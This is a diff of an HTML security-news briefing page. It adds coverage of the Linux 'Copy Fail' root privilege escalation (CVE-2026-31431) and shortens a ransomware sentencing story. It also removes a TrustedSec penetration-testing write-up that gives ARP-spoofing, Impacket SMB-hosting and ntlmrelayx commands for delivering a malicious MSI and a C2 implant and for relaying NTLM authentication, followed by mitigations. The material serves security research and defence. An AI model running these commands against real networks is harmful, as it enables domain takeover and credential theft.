@@ -59,12 +59,39 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-05-02</h1>
+        <h1>Security Briefing // 2026-05-03</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">CVE-2026-31431: Copy Fail vulnerability enables Linux root privilege escalation across cloud environments</button></li><li><button onclick="show('art-1')">US ransomware negotiators get 4 years in prison over BlackCat attacks</button></li><li><button onclick="show('art-2')">Anti-DDoS Firm Heaped Attacks on Brazilian ISPs</button></li><li><button onclick="show('art-3')">ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay</button></li><li><button onclick="show('art-4')">CISA Adds Actively Exploited ConnectWise and Windows Flaws to KEV</button></li><li><button onclick="show('art-5')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-6')">CISA Adds 4 Exploited Flaws to KEV, Sets May 2026 Federal Deadline</button></li><li><button onclick="show('art-7')">Patch Tuesday, April 2026 Edition</button></li><li><button onclick="show('art-8')">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
+            <ul><li><button onclick="show('art-0')">CISA Adds Actively Exploited Linux Root Access Bug CVE-2026-31431 to KEV</button></li><li><button onclick="show('art-1')">CVE-2026-31431: Copy Fail vulnerability enables Linux root privilege escalation across cloud environments</button></li><li><button onclick="show('art-2')">US ransomware negotiators get 4 years in prison over BlackCat attacks</button></li><li><button onclick="show('art-3')">Anti-DDoS Firm Heaped Attacks on Brazilian ISPs</button></li><li><button onclick="show('art-4')">CISA Adds Actively Exploited ConnectWise and Windows Flaws to KEV</button></li><li><button onclick="show('art-5')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-6')">Patch Tuesday, April 2026 Edition</button></li><li><button onclick="show('art-7')">Building a Detection Foundation: Part 5 - Correlation in Practice</button></li><li><button onclick="show('art-8')">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
+            <h2 class="article-title">CISA Adds Actively Exploited Linux Root Access Bug CVE-2026-31431 to KEV</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/05/cisa-adds-actively-exploited-linux-root.html" target="_blank">Original Link</a></p>
+            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday [added](https://www.cisa.gov/news-events/alerts/2026/05/01/cisa-adds-one-known-exploited-vulnerability-catalog) a recently disclosed security flaw impacting various Linux distributions to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, citing evidence of active exploitation in the wild.
+The vulnerability, tracked as [CVE-2026-31431](https://thehackernews.com/2026/04/new-linux-copy-fail-vulnerability.html) (CVSS score: 7.8), is a case of local privilege escalation (LPE) flaw that could allow an unprivileged local user to obtain root. The nine-year-old flaw is also tracked as Copy Fail by Theori and Xint. Fixes have been made available in Linux kernel versions 6.18.22, 6.19.12, and 7.0.
+"Linux Kernel contains an incorrect resource transfer between spheres vulnerability that could allow for privilege escalation," CISA said in an advisory.
+In a write-up published earlier this week, the researchers said [Copy Fail](https://cert.europa.eu/publications/security-advisories/2026-005/) is the result of a logic bug in the Linux kernel's authentication cryptographic template that allows an attacker to reliably trigger privilege escalation trivially by means of a 732-byte Python-based exploit. It was introduced through three separate, individually harmless changes to the Linux kernel made in 2011, 2015, and 2017.
+The high-severity security vulnerability [impacts](https://www.sysdig.com/blog/cve-2026-31431-copy-fail-linux-kernel-flaw-lets-local-users-gain-root-in-seconds) Linux distributions shipped since 2017, and permits an unprivileged local user to obtain root-level access by corrupting the kernel's in-memory [page cache](https://en.wikipedia.org/wiki/Page_cache) of any readable file, including setuid binaries. This corruption could be carried out by unprivileged users and could result in code execution with root permissions.
+"Because the page cache represents the in-memory version of executables, modifying it effectively alters binaries at execution time without touching disk," Google-owned Wiz [said](https://www.wiz.io/blog/copyfail-cve-2026-31431-linux-privilege-escalation-vulnerability). "This enables attackers to inject code into privileged binaries (e.g., /usr/bin/su) and thereby gain root privileges."
+The prevalence of Linux in cloud environments means the vulnerability has a significant impact. Kaspersky, in its analysis of the flaw, said Copy Fail poses a serious risk to containerized environments, as Docker, LXC, and Kubernetes "grant processes inside a container access to the AF_ALG subsystem if the algif_aead module is loaded into the host kernel" by default.
+"Copy Fail poses a risk of breaching container isolation and gaining control over the physical machine," the Russian security vendor [said](https://securelist.com/tr/copyfail-root-linux/119634/). "At the same time, exploitation does not require the use of complex techniques, such as race conditions or memory address guessing, which lowers the entry barrier for a potential attacker."
+"Detecting the attack is difficult because the exploit uses only legitimate system calls, which are hard to distinguish from normal application behavior."
+Adding to the urgency is the availability of a fully working exploit proof-of-concept (PoC), with Kaspersky stating Go and Rust versions of the original Python implementation have already been detected in open-source repositories.
+CISA did not share any details about how the vulnerability is being exploited in the wild. However, the Microsoft Defender Security Research Team said it's "seeing preliminary testing activity that might result most likely in increased threat actor exploitation over the next few days."
+"The attack vector is local (AV:L) and requires low privileges with no user interaction, meaning any unprivileged user on a vulnerable system can attempt exploitation," it [added](https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/). "Critically, this vulnerability is not remotely exploitable in isolation, but becomes highly impactful when chained with an initial access vector such as Secure Shell (SSH) access, malicious CI job execution, or container footholds."
+The tech giant has also detailed one possible route attackers could take to exploit the vulnerability -
+- Conduct reconnaissance to identify a Linux host or container running a kernel version susceptible to Copy Fail.
+- Prepare a small Python trigger for use against the endpoint.
+- Execute the exploit from a low-privilege context, either as a regular Linux user on a host or a compromised container process with no special capabilities.
+- Exploit performs a controlled 4‑byte overwrite in the kernel page cache, leading to corruption of sensitive kernel‑managed data.
+- Attacker escalates their process to UID 0 and obtain full root privileges.
+Federal Civilian Executive Branch (FCEB) agencies have been advised to apply the fixes by May 15, 2026, as updates have been pushed by impacted Linux distributions. If patching is not an immediate option, organizations are recommended to disable the affected feature, implement network isolation, and apply access controls.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-1" class="article-body">
             <h2 class="article-title">CVE-2026-31431: Copy Fail vulnerability enables Linux root privilege escalation across cloud environments</h2>
             <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/" target="_blank">Original Link</a></p>
             <div class="content-text">Microsoft Defender is investigating a high-severity local privilege escalation vulnerability ([CVE-2026-31431](https://nvd.nist.gov/vuln/detail/CVE-2026-31431)) affecting multiple major Linux distributions including Red Hat, SUSE, Ubuntu, and AWS Linux. This vulnerability allows unauthorized escalation of privileges to root, impacting a significant portion of cloud Linux workloads and millions of Kubernetes clusters. Although active exploitation has been limited and primarily observed in proof-of-concept testing, the vulnerability’s broad applicability has caused widespread concern.
@@ -127,33 +154,17 @@ Review our documentation to learn more about our real-time protection capabiliti
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-1" class="article-body">
+        <div id="art-2" class="article-body">
             <h2 class="article-title">US ransomware negotiators get 4 years in prison over BlackCat attacks</h2>
             <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/us-ransomware-negotiators-get-4-years-in-prison-over-blackcat-attacks/" target="_blank">Original Link</a></p>
-            <div class="content-text">Two former employees of cybersecurity incident response companies Sygnia and DigitalMint were sentenced to four years in prison each for targeting U.S. companies in BlackCat (ALPHV) ransomware attacks.
-40-year-old Ryan Clifford Goldberg (a former Sygnia incident response manager) and 36-year-old Kevin Tyler Martin (a DigitalMint ransomware negotiator) [were charged in November](https://www.bleepingcomputer.com/news/security/us-cybersecurity-experts-indicted-for-blackcat-ransomware-attacks/) and [pleaded guilty](https://www.bleepingcomputer.com/news/security/us-cybersecurity-experts-plead-guilty-to-blackcat-alphv-ransomware-attacks/) in December to conspiracy to obstruct commerce by extortion.
-Together with 41-year-old Angelo Martino, a third accomplice who also pleaded guilty in April, the two acted as BlackCat ransomware affiliates between May 2023 and November 2023, breaching the networks of multiple victims across the United States.
-GO TO PAGE
-According to [court documents](https://legacy.www.documentcloud.org/documents/26212062-digital-mint-sygnia-indictment/), they paid a 20% share of ransoms in exchange for access to BlackCat's ransomware and extortion platform.
-The list of victims includes a Maryland pharmaceutical company, a Tampa medical device manufacturer, a California engineering firm, a Virginia drone manufacturer, and a California doctor's office.
-Prosecutors said the Tampa medical device company paid $1.27 million after its servers were encrypted and it received a $10 million ransom demand in May 2023, with the payment laundered and split three ways with Martino.
-While other companies whose networks were breached by Goldberg and Martin also received ransom demands ranging from $300,000 to $10 million, the indictment does not indicate whether they received any additional payments.
-"These defendants exploited specialized cybersecurity knowledge not to protect victims, but to extort them," [said U.S. Attorney Jason A. Reding Quiñones on Thursday](https://www.justice.gov/opa/pr/two-americans-who-attacked-multiple-us-victims-using-alphv-blackcat-ransomware-sentenced). "They used ransomware to lock down critical systems, steal sensitive data, and pressure American businesses into paying to regain access to their own information."
-"We strongly condemn these former employees' criminal behavior, which violated our values, ethical standards, and the law. When we learned about the conduct, we immediately terminated both individuals," DigitalMint CEO Jonathan Solomon also told BleepingComputer earlier this month after Martino pleaded guilty.
-The FBI previously linked the BlackCat ransomware gang to [more than 60 breaches](https://www.bleepingcomputer.com/news/security/fbi-blackcat-ransomware-breached-at-least-60-entities-worldwide/) between November 2021 and March 2022.
-In a separate advisory, the bureau added that the cybercrime operation [collected at least $300 million in ransom payments](https://www.bleepingcomputer.com/news/security/fbi-alphv-ransomware-raked-in-300-million-from-over-1-000-victims/) from more than 1,000 victims through September 2023.
-[99% of What Mythos Found Is Still Unpatched.](https://hubs.li/Q04crVgD0)
-AI chained four zero-days into one exploit that bypassed both renderer and OS sandboxes. A wave of new exploits is coming.
-At the Autonomous Validation Summit (May 12 & 14), see how autonomous, context-rich validation finds what's exploitable, proves controls hold, and closes the remediation loop.
-[Claim Your Spot](https://hubs.li/Q04crVgD0)
-Post a Comment Community Rules
-You need to login in order to post a comment
-Not a member yet? Register Now</div>
+            <div class="content-text">Two former employees of cybersecurity incident response companies Sygnia and DigitalMint were sentenced to four years in prison each for targeting U.S. companies in BlackCat (ALPHV) ransomware attacks. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-2" class="article-body">
+        <div id="art-3" class="article-body">
             <h2 class="article-title">Anti-DDoS Firm Heaped Attacks on Brazilian ISPs</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/04/anti-ddos-firm-heaped-attacks-on-brazilian-isps/" target="_blank">Original Link</a></p>
             <div class="content-text">A Brazilian tech firm that specializes in protecting networks from distributed denial-of-service (DDoS) attacks has been enabling a botnet responsible for an extended campaign of massive DDoS attacks against other network operators in Brazil, KrebsOnSecurity has learned. The firm’s chief executive says the malicious activity resulted from a security breach and was likely the work of a competitor trying to tarnish his company’s public image.
@@ -212,94 +223,6 @@ Era só deixar o cartão de visita com eles que vinha o presente.</div>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-3" class="article-body">
-            <h2 class="article-title">ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay</h2>
-            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay" target="_blank">Original Link</a></p>
-            <div class="content-text">ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay
-Table of contents
-TL;DR - If you have WriteGPLink on an Active Directory Organizational Unit (OU) and you’re on the same network segment as a computer within that OU, you can abuse that permission to link an existing Group Policy Objects (GPO) with a software installation policy and ARP spoof the server it references, resulting in code execution as SYSTEM without modifying SYSVOL. More broadly, GPOs that reference UNC paths for drive maps, logon scripts, and startup scripts can be redirected to an attacker-controlled host for NTLMv2 capture. Furthermore, by deliberately disrupting SMB sessions, authentication can be forced to fall back to WebDAV, which sends NTLM over HTTP that can be relayed to services like LDAP(S), AD CS, and SMB.
-Introduction
-On engagements, it is common to find overly broad groups like Authenticated Users or Domain Computers with permissions over OUs that they were never intended to have. Whether it is left over from migration, a testing OU that never got cleaned up, or an AI-assisted auto-accept gone wrong, these misconfigurations frequently surface in BloodHound output. One (1) of the more interesting permissions that you may find is WriteGPLink, which indicates the principal has permission to modify the gPLink attribute of the targeted OU/domain node. This alone does not let you edit the GPO itself or create a new one, but it does let you find existing GPOs in the domain and force them to apply to the objects inside that OU.
-The concept of abusing GPO and OU relationships isn’t new. [wald0's foundational work on GPO attack primitives](https://wald0.com/?p=179) laid the groundwork, [WithSecure’s OU Having a Laugh](https://labs.withsecure.com/publications/ou-having-a-laugh) showed how OU attribute modification could be weaponized through rogue infrastructure, and Synacktiv’s [OUned.py](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory) provides automation for this style of abuse. The caveat is that these approaches usually depend on additional privileges such as creating machine accounts and adding DNS records. In tighter environments, those requirements may neutralize this path entirely.
-Those limitations led to me to a different approach. Instead of building malicious GPO infrastructure from scratch, WriteGPLink could be abused by taking advantage of software deployments that already exist in the environment. If a legitimate GPO contained a software installation policy pointing to a UNC path and you could ARP spoof a target computer into resolving to your host, then the target would process the linked policy on reboot and retrieve a malicious installer. This installer would then deploy as SYSTEM with no SYSVOL modification, machine account creation, or DNS record changes required.
-Digging through various GPO settings, it became clear that software installation was only one (1) of several GPO features that could be weaponized. Mapped drives, logon scripts, and startup scripts hosted on UNC paths all cause targets to reach out to remote servers during logon or policy processing. An attacker on the same broadcast domain can ARP spoof the target and impersonate the SMB connection. For drive mappings, this technique can capture NTLMv2 authentication as well as force a fallback to WebDAV that sends relayable NTLM over HTTP. For logon or startup scripts, it can allow replacement content to be served from the expected path and executed as the user or computer.
-For brevity, this blog assumes familiarity with core AD concepts and common offensive tooling. These attack paths are lengthy enough on their own, so the focus here is on the techniques, tooling used, and what worked.
-Attack 1: WriteGPLink + MSI Deployment Spoofing
-As with all offensive security, exercise caution, as incorrectly modifying settings such as a linked GPO can quickly cause unintended, widespread consequences across a domain.
-This chain assumes an authenticated position in the domain with the ability to collect BloodHound data and read from SYSVOL, as well as network adjacency to a computer contained within the target OU. BloodHound data shows this edge where the low-privileged user coby@woke.local has WriteGPLink over the CoolComputers OU. This OU contains WIN11-WOKE.WOKE.LOCAL.
-Once this edge is identified, the next step is reviewing SYSVOL to find an existing GPO worth linking. SYSVOL is readable by any authenticated user and can be cloned with tools such as smbclient or rsync.
-mkdir -p /mnt/$DOMAIN/SYSVOL/
-mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
-rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
-With SYSVOL cloned, tools like [GPOHound](https://github.com/cogiceo/GPOHound) are excellent for deeper GPO analysis. I professionally vibecoded [parse_sysvol.py](https://raw.githubusercontent.com/Coontzy1/HacknScripts/refs/heads/master/parse_sysvol.py) to produce the specific output needed for these attacks. The script correlates SYSVOL data, GPO settings, and GPO GUIDs with BloodHound data to show affected OUs, users, and computers, while specifically identifying software installations, drive maps, and scripts.
-python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
-Reviewing the output, the SOFTWAREINSTALLS GPO {88D041AF-58E8-47BC-AB13-110B2F438DB2} stands out. It deploys multiple MSIs, including googlechromestandaloneenterprise64.msi, which points to DC02.
-Here are a couple of notes before moving on. The advertised software cannot already be installed on the target, since Group Policy Software Installation/Windows Installer tracks products by ProductCode and will usually skip a package if it believes it is already present. This may behave differently in upgrade or redeployment scenarios. Also, .aas advertisement files appear to persist in SYSVOL even after related software installation has been removed from the GPO, meaning SYSVOL may contain stale entries for software that is no longer being actively requested for deployment.
-In practice, this makes the last-modified timestamp of an .aas a useful heuristic for identifying live deployments, although creating an SMB share with multiple file names would work as well. It is also helpful that the MSI paths referenced here use a direct hostname rather than the domain namespace. Domain-based UNC paths trigger DFS referrals through domain controller infrastructure and make ARP spoofing much more finicky. While spoofing all domain controller IP addresses could still create opportunities to intercept connection attempts, it also prevents the target from reaching any domain controller for authentication, group policy processing, and other domain functions.
-That aside, with our target GPO identified, linking it can be done with [link_gpo.py](https://raw.githubusercontent.com/Coontzy1/HacknScripts/refs/heads/master/link_gpo.py). Other tools may be useful here, such as [GPOwned.py](https://github.com/X-C3LL/GPOwned). Appending to the end of the gPLink string gives our link the highest normal precedence, but further modifications could be made to set our GPO to enforced.
-python3 link_gpo.py -u coby -p Password01 -d woke.local -dc-ip 192.168.100.67 –gpo-guid ‘{88D041AF-58E8-47BC-AB13-110B2F438DB2}’ --target-ou "OU=CoolComputers,DC=woke,DC=local"
-With this link in place, we need to convince the WIN11-WOKE that we are DC02. A basic ARP spoof against DC02’s IP address (192.168.100.69) suffices, causing traffic destined to DC02 to be sent to our attacker host instead. Additionally, I add a secondary IP address to my interface, so the traffic destined to DC02 is not dropped. Then, I use the tool [arpspoof-ng](https://github.com/Coontzy1/arpspoof-ng) to send gratuitous ARP packets.
-ip addr add 192.168.100.69/32 dev ens32
-arpspoof-ng -i ens32 -t 192.168.100.201,192.168.100.224 -s 192.168.100.69
-Then, using [Impacket](https://github.com/fortra/impacket)’s smbserver.py, we stand up an SMB server with the installers share hosting our malicious googlechromestandaloneenterprise64.msi. Our malicious payload is a standalone C# add-user program compiled into an MSI. Then, we patch the Windows Installer so its ProductCode and PackageCode match the values of the real package found in SYSVOL. Failure to do so results in errors such as the one (1) shown below, but the failures may also be operator error.
-smbserver.py installers /root/tmp/installers/ -smb2support --interface-address 192.168.100.69 -debug -ts
-When WIN11-WOKE reaches the Group Policy refresh interval, roughly every 90 minutes, the newly linked GPO becomes visible to the system. However, the software installation itself does not occur until the computer reboots, which means we must be ARP spoofing when that reboot occurs. From a low-user perspective, forcing that reboot may not always be possible. One (1) unique solution for remotely restarting a Windows system without Administrator rights is through RDP when NLA is disabled.
-xfreerdp /v:192.168.100.224 /u:test /p:test /sec:tls /cert:ignore
-Then, once the system is restarted, it retrieves our malicious package, installs it, and adds the local user with Administrator permissions. At that point, we have achieved code execution as SYSTEM stemming from WriteGPLink, given favorable network access and timing.
-This attack is definitely possible, but that is assuming a couple of stars align. You need layer-2 access for ARP spoofing, a viable unlinked policy to apply, and a timely reboot to happen. Even with those caveats, I hope this can stand as another viable method for exploiting WriteGPLink when other AD conditions are not available. And if the OU contains users rather than computers, opportunities still exist within linked logon scripts, or scheduled tasks may come into play.
-Attack 2: Drive Map Spoofing + NTLM Capture and WebDAV Downgrade
-Beyond software installation, GPOs are commonly used to deploy mapped drives through Group Policy Preferences. These Drives.xml configurations contain UNC paths that affect users that will automatically connect during logon or policy processing. Utilizing the [parse_sysvol.py](https://raw.githubusercontent.com/Coontzy1/HacknScripts/refs/heads/master/parse_sysvol.py) script from before, it can be correlated with BloodHound data to enumerate which users have what drives and where they connect to.
-python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
-In this case, these drive mappings all point towards DC02 by hostname. Every time a user logs in, their machine makes a network request to connect to the referenced share. As noted earlier, these paths that are using direct hostnames will make the spoofing setup match easier.
-This approach is also a bit different from broadcast name-resolution poisoning tools like [Responder](https://github.com/lgandx/Responder). While Responder is excellent at what it does, my goal here was to be a bit more surgical. By ARP spoofing a single IP address only to a subset of hosts, the affected machines still resolve DC02 through normal processes and receive the expected address; however, the ARP entry redirects the traffic to the attacker-controlled host instead.
-Then, to perform this attack, I can set up either smbserver.py or ntlmrelayx.py while using [arpspoof-ng](https://github.com/Coontzy1/arpspoof-ng) to target multiple hosts simultaneously. Authentication can be triggered in several ways, such as through user logon, browsing to the mapped drive in Explorer, or reconnection attempts to a persistent drive after a session lock/unlock. When those connections reach the attacker-controlled host, the NTLMv2 authentication can be captured for offline recovering or relayed to a system that does not enforce SMB Signing.
-ip addr add 192.168.100.69/32 dev ens32
-arpspoof-ng -i ens32 -t 192.168.100.201,192.168.100.224,192.168.100.67 -s 192.168.100.69
-ntlmrelayx.py -t smb://<NO_SMB_SIGNING_HOST> -smb2support -socks --interface-ip 192.168.100.69 --keep-relaying -of hashes
-While testing the drive map spoofing attack, I noticed something odd. A stale SMB server was left running between tests, which caused the client to retry the same UNC path over HTTP on port 80 instead of simply failing. This turned out to be Windows WebClient service stepping in as a fallback after SMB connection failed.
-To confirm this was not a fluke, I tested it with a custom SMB server that sent the same garbage error code observed in the packet capture and saw the same result. Then, I repeated the test using smbserver.py configured with authentication that would fail, which produced the same result. After the SMB failure, the client retried over WebDAV and sent NTLM authentication over HTTP. Additionally, the captured hashes confirmed the target SPN was changed to HTTP/DC02.woke.local.
-This method is particularly useful because once the client falls back to WebDAV, the authentication is no longer tied to an SMB session. That makes it far more flexible for NTLM relay attacks to other services such as LDAP, LDAPS, AD CS, and SMB.
-After validating the behavior in the lab, I found that [Syntaktiv documented the same SMB-to-WebDAV fallback](https://www.synacktiv.com/en/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking) in the context of multicast poisoning using Responder. Their work showed that error codes such as STATUS_BAD_NETWORK_NAME and STATUS_LOGON_FAILURE can trigger a retry but confirmed that the trigger list was not exhaustive. Notably, my testing showed that the same behavior also occurs against existing SMB shares while ARP spoofing. Synacktiv also noted that WebClient needed to be installed and running. In my testing, the service started automatically in the background, which aligns with later [SpecterOps research](https://specterops.io/blog/2026/01/14/wait-why-is-my-webclient-started-sccm-hierarchy-takeover-via-ntlm-relay-to-ldap/). Note that on Windows Server, the WebClient service is not installed by default.
-To demonstrate this attack, I first confirm that the WebClient service is not running on the target workstation with NetExec.
-With arpspoof-ng running in the background to redirect DC02’s IP address to the attack host, I start smbserver.py on port 445 and configured it to require authentication that the client could not satisfy. Responder can also be used with the -E option. Then, I also start ntlmrelayx.py, listening on port 80, to capture and relay the HTTP NTLM authentication. When the user logs in and Group Policy processes the mapped drive, the workstation sends the authentication to the attack host on SMB, which fails. Then, the NTLM authentication arrives over HTTP, where ntlmrelayx.py relays it to LDAP.
-smbserver.py share . -smb2support -debug -ts --interface-address 192.168.100.69 -username test -password test
-ntlmrelayx.py -t ldap://192.168.100.67 -socks -smb2support -ip 192.168.100.69 --no-smb-server --keep-relaying -of hashes.txt
-Lastly, I first confirm that the WebClient service is now running on the target workstation after exploitation.
-Attack 3: Logon Script Spoofing for Code Execution
-Now that we’ve covered some other approaches to GPO-based abuse, it is worth looking at logon scripts directly. When a GPO assigns a logon script, the Group Policy client retrieves the referenced script from the UNC path, typically something under SYSVOL or NETLOGON, and executes it under the user’s security context. Startup scripts follow the same model, except they run as SYSTEM during startup before any user logs on. These scripts are often used to map drive or copy files, but they may also launch executables or PowerShell scripts hosted somewhere else on the network. If either the script itself or a downstream resource is referenced by a spoofable hostname, that reference becomes an opportunity for this attack.
-Running [parse_sysvol.py](https://raw.githubusercontent.com/Coontzy1/HacknScripts/refs/heads/master/parse_sysvol.py) against our cloned SYSVOL again, we enumerate the following configurations.
-python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
-As the output shows, multiple users are in the MAPPEDDRIVES OU that will fetch Logon.bat from SYSVOL on every sign-in. If we inspect this Logon.bat—which in our case we have cloned, since it resided in SYSVOL—it references a PowerShell script hosted on a different server.
-In the lab environment, FILESERVER01 resolves to 192.168.100.226. The next step is to use arpspoof-ng to target the two (2) Windows hosts that will later attempt to process the script.
-ip addr add 192.168.100.226/32 dev ens32
-arpspoof-ng -i ens32 -t 192.168.100.201,192.168.100.224 -s 192.168.100.226
-Next, smbserver.py is set up to host a malicious Update-Monitor.ps1, our [Badrats](https://gitlab.com/KevinJClark/badrats) implant. When that script executes, the target host should call back to the Badrats server. At that point, the stage is set and we must wait until a user logs in.
-smbserver.py tools . -smb2support -debug -ts --interface-address 192.168.100.226
-Once that happens, the Group Policy client pulls the normal Logon.bat from the domain controller and processes it normally until it reaches the \\FILESERVER01\tools\Update-Monitor.ps1 reference. That request is redirected to our SMB server, the malicious script is retrieved, and a moment later, the user checks into our C2 server.
-Python3 badrats_server.py
-Beyond These Attacks
-The three (3) attacks in this post are strong, concrete examples, but they are not an exhaustive list. They reflect a broader pattern in how Group Policy and workstations interact across the network, while also reinforcing how dangerous it is to lack layer-2 protections.
-Logoff and shutdown scripts mirror their logon and startup counterparts, just with different triggers. GPP Files, Folders, and Folder Redirection apply the same idea with file placement and file retrieval paths. Scheduled Tasks can trigger execution at known intervals, although the files they reference are often local rather than remote. With enough situational awareness, a generic GPO mechanism can become a highly targeted opportunity.
-More importantly, WriteGPLink is only one (1) way to reach the same outcome. Permissions like AddMember or AllExtendedRights on an OU can let you place a privileged principal inside it, causing it to process an already linked, vulnerable GPO. The same applies if you can create, link, or edit a GPO directly. The problem compounds further if resources referenced in SYSVOL can be modified because of misconfigurations, or if lax permissions exist on referenced network shares. In those cases, there is no need to redirect traffic at all.
-Mitigations
-- Enforce SMB Signing and LDAP protections. Require SMB Signing where possible, and enable LDAP signing and channel binding where supported. This breaks several of the relay paths discussed above.
-- Audit AD ACLs regularly. Review permissions on users, OUs, and groups for rights such as WriteGPLink, AddMember, WriteOwner, and other related control paths.
-- Harden layer-2 protections. Enable controls such as Dynamic ARP Inspection and related protections that make ARP spoofing substantially harder.
-- Audit GPO and GPP references on network resources. Review logon scripts, startup scripts, drive mappings, and other configurations that may be used in a more strategic attack.
-- Tighten permissions on file shares. Ensure only the intended administrators and management systems can modify scripts, binaries, and installers referenced by GPOs.
-Conclusion
-Hopefully, some of these ideas are useful in your own offensive or defensive security work. DFS-backed UNC path spoofing may prove to be a stronger approach for some of these attacks. If you have found a feasible way to make this work, feel free to reach out. If you enjoyed the post, follow me on X/Twitter [@Coontzy1](https://x.com/Coontzy1) for constant reposts and no original thought.
-Shoutouts
-Larry Spohn - Blog Peer Review
-TrustedSec QA Team - Quality assurance and editing
-Tools
-[arpspoof-ng](https://github.com/Coontzy1/arpspoof-ng)[badrats](https://gitlab.com/KevinJClark/badrats)[BloodHound](https://github.com/specterops/bloodhound)[dsniff (arpspoof)](https://github.com/tecknicaltom/dsniff)[GPOHound](https://github.com/cogiceo/GPOHound)[GPOwned](https://github.com/X-C3LL/GPOwned)[Impacket](https://github.com/fortra/impacket)[link_gpo.py](https://raw.githubusercontent.com/Coontzy1/HacknScripts/refs/heads/master/link_gpo.py)[NetExec](https://github.com/Pennyw0rth/NetExec)[parse_sysvol.py](https://raw.githubusercontent.com/Coontzy1/HacknScripts/refs/heads/master/parse_sysvol.py)[Responder](https://github.com/lgandx/Responder)
-References
-[https://labs.withsecure.com/publications/ou-having-a-laugh](https://labs.withsecure.com/publications/ou-having-a-laugh)[https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/support-for-unc-naming-and-mup](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/support-for-unc-naming-and-mup)[https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-policy/group-policy-processing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-policy/group-policy-processing)[https://specterops.io/blog/2026/01/14/wait-why-is-my-webclient-started-sccm-hierarchy-takeover-via-ntlm-relay-to-ldap/](https://specterops.io/blog/2026/01/14/wait-why-is-my-webclient-started-sccm-hierarchy-takeover-via-ntlm-relay-to-ldap/)[https://wald0.com/?p=179](https://wald0.com/?p=179)[https://www.synacktiv.com/en/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking](https://www.synacktiv.com/en/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking)[https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
         <div id="art-4" class="article-body">
             <h2 class="article-title">CISA Adds Actively Exploited ConnectWise and Windows Flaws to KEV</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/cisa-adds-actively-exploited.html" target="_blank">Original Link</a></p>
@@ -331,20 +254,6 @@ This product is provided subject to this [Notification](/notification) and this 
             <hr class="separator">
         </div>
         <div id="art-6" class="article-body">
-            <h2 class="article-title">CISA Adds 4 Exploited Flaws to KEV, Sets May 2026 Federal Deadline</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/cisa-adds-4-exploited-flaws-to-kev-sets.html" target="_blank">Original Link</a></p>
